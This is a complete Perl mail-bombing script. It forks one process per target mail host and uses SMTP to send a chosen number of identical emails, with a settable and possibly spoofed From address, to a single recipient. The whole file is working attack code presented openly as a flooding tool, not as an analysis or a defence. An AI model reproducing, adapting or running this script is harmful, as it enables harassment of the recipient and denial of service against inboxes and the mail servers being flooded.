#!/usr/bin/env perl


### INCLUDES
use strict;
use warnings;
use Getopt::Long;
use IO::Socket::INET;
use Net::SMTP;
use POSIX qw/WNOHANG/;
use Email::Sender::Simple qw/try_to_sendmail/;
use Email::Sender::Transport::SMTP;


### GLOBALS
my ($to, $from, $count, $subject);


### SUBROUTINE DECLARATIONS
sub main;
sub usage;
sub mbomb;


### MAIN FUNCTION
main;


### SUBROUTINE DEFINITIONS
sub main {
  GetOptions (
    "to=s"      => \$to,
    "from=s"    => \$from,
    "count=i"   => \$count,
    "subject=s" => \$subject
  );

  usage if !defined $to;
  usage if !defined $from;
  usage if !defined $subject;

  # Should automatically reap zombies.
  $SIG{CHLD} = 'IGNORE';

  for my $mailhost (@ARGV) {
    print "mail bombing $mailhost ($count emails)\n";

    my $pid = fork;
    $pid < 0 and die "fork failed: $!";

    if ($pid == 0) {  # Child
      mbomb $mailhost;
      exit 0;
    }
  }

  exit 0;
}


sub mbomb {
  my $mailhost = shift;
  my $counter = $count;
  my $transport = Email::Sender::Transport::SMTP->new({
    host => $mailhost,
  });

  while ($counter-- > 0) {
    my $email = Email::Simple->create(
      header => [
          To      => $to,
          From    => $from,
          Subject => $subject,
      ],
      body   => $subject,
    );
  
    try_to_sendmail($email, { transport => $transport })
       or warn "try_to_sendmail failed: $!";
  }

  return;
}
    

sub usage {
  print "usage: $0 --to=<recipient address> --from=<sender address> --count=<number of emails> --subject=<subject line> mailhost ...\n";
  print "usage: $0 -t <recipient address> -f <sender address> -c <number of emails> -s <subject line> mailhost ...\n";
  exit 1;
}
